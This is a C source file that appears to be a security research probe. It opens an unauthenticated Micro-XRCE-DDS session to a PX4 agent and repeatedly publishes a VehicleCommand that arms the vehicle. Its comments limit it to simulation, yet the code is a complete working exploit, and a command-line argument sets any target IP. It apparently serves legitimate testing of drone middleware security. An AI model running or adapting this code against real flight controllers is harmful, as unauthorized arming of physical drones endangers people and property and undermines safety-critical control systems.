// xrce_probe.c — minimal UNAUTHENTICATED XRCE peer for Phase 2 / H5.
// SITL + loopback ONLY. Connects to PX4's default Micro-XRCE-DDS Agent (UDP :8888)
// with NO credentials, joins DDS domain 0, and publishes a VehicleCommand (ARM) to
// rt/fmu/in/vehicle_command to measure whether the DEFAULT bridge accepts commands
// from an unrelated peer. Arms the SIMULATED vehicle only. Never target real hardware.
#include <uxr/client/client.h>
#include <ucdr/microcdr.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <time.h>

static uint64_t now_us(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000ULL + (uint64_t)ts.tv_nsec / 1000ULL;
}

// px4_msgs VehicleCommand field order (CDR; ucdr handles alignment).
// param5/param6 are float64 (double) — the classic gotcha.
static void serialize_vehicle_command(ucdrBuffer* b) {
    ucdr_serialize_uint64_t(b, now_us()); // timestamp
    ucdr_serialize_float(b, 1.0f);        // param1 = 1 -> ARM
    ucdr_serialize_float(b, 0.0f);        // param2
    ucdr_serialize_float(b, 0.0f);        // param3
    ucdr_serialize_float(b, 0.0f);        // param4
    ucdr_serialize_double(b, 0.0);        // param5 (double!)
    ucdr_serialize_double(b, 0.0);        // param6 (double!)
    ucdr_serialize_float(b, 0.0f);        // param7
    ucdr_serialize_uint32_t(b, 400);      // command = VEHICLE_CMD_COMPONENT_ARM_DISARM
    ucdr_serialize_uint8_t(b, 1);         // target_system   (PX4 SITL = 1)
    ucdr_serialize_uint8_t(b, 1);         // target_component
    ucdr_serialize_uint8_t(b, 255);       // source_system   (attacker)
    ucdr_serialize_uint8_t(b, 240);       // source_component
    ucdr_serialize_uint8_t(b, 0);         // confirmation
    ucdr_serialize_bool(b, true);         // from_external
}

int main(int argc, char** argv) {
    const char* ip   = (argc > 1) ? argv[1] : "127.0.0.1";
    const char* port = (argc > 2) ? argv[2] : "8888";

    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, ip, port)) {
        printf("error: udp transport init\n"); return 1;
    }
    uxrSession session;
    uxr_init_session(&session, &transport.comm, 0xA77AC7EDu); // attacker session key
    if (!uxr_create_session(&session)) {
        printf("error: create_session (agent not on %s:%s?)\n", ip, port); return 1;
    }
    printf("[+] session with agent %s:%s established (no credentials)\n", ip, port);

    uint8_t obuf[2048], ibuf[2048];
    uxrStreamId out = uxr_create_output_reliable_stream(&session, obuf, sizeof(obuf), 4);
    uxr_create_input_reliable_stream(&session, ibuf, sizeof(ibuf), 4);

    uxrObjectId participant = uxr_object_id(0x01, UXR_PARTICIPANT_ID);
    uint16_t r1 = uxr_buffer_create_participant_xml(&session, out, participant, 0,
        "<dds><participant><rtps><name>attacker</name></rtps></participant></dds>", UXR_REPLACE);

    uxrObjectId topic = uxr_object_id(0x01, UXR_TOPIC_ID);
    uint16_t r2 = uxr_buffer_create_topic_xml(&session, out, topic, participant,
        "<dds><topic><name>rt/fmu/in/vehicle_command</name>"
        "<dataType>px4_msgs::msg::dds_::VehicleCommand_</dataType></topic></dds>", UXR_REPLACE);

    uxrObjectId pub = uxr_object_id(0x01, UXR_PUBLISHER_ID);
    uint16_t r3 = uxr_buffer_create_publisher_xml(&session, out, pub, participant,
        "<dds><publisher><name>a</name></publisher></dds>", UXR_REPLACE);

    uxrObjectId dw = uxr_object_id(0x01, UXR_DATAWRITER_ID);
    uint16_t r4 = uxr_buffer_create_datawriter_xml(&session, out, dw, pub,
        "<dds><data_writer><topic><kind>NO_KEY</kind><name>rt/fmu/in/vehicle_command</name>"
        "<dataType>px4_msgs::msg::dds_::VehicleCommand_</dataType></topic></data_writer></dds>",
        UXR_REPLACE);

    uint16_t reqs[4] = {r1, r2, r3, r4}; uint8_t st[4];
    if (!uxr_run_session_until_all_status(&session, 2000, reqs, st, 4))
        printf("[!] entity status: %u %u %u %u (type/topic may not match PX4 — check agent -v6)\n",
               st[0], st[1], st[2], st[3]);
    else
        printf("[+] entities created; datawriter should match PX4's reader on domain 0\n");

    uint8_t scratch[256]; ucdrBuffer m; ucdr_init_buffer(&m, scratch, sizeof(scratch));
    serialize_vehicle_command(&m);
    uint32_t topic_size = ucdr_buffer_length(&m);

    for (int i = 0; i < 5; ++i) {
        ucdrBuffer w;
        if (uxr_prepare_output_stream(&session, out, dw, &w, topic_size)) {
            serialize_vehicle_command(&w);
            uxr_run_session_until_confirm_delivery(&session, 500);
            printf("[+] sent UNSIGNED VehicleCommand ARM (#%d, %u bytes)\n", i + 1, topic_size);
        } else {
            printf("[!] prepare_output_stream failed (#%d)\n", i + 1);
        }
        struct timespec ts = {0, 200 * 1000 * 1000}; nanosleep(&ts, NULL);
    }

    uxr_delete_session(&session);
    uxr_close_udp_transport(&transport);
    printf("[i] done — check the effect in pxh> (see the test procedure, §5/§8)\n");
    return 0;
}
